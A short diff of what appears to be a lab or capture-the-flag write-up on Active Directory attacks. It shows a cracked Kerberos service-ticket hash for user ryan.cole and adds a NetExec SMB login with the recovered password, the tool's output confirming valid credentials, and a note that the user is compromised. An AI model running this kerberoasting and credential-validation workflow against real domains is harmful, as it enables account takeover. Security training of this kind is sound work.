@@ -705,5 +705,10 @@ $krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local\ryan.cole*$a7d8558827
 Ill feed this into hashcat and crack the hash
 
 ```python
-
+nxc smb dc.hsm-defense.local -u ryan.cole -p 'napalmcrack' -k 
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\ryan.cole:napalmcrack
 ```
+
+This user is now compromised!
+
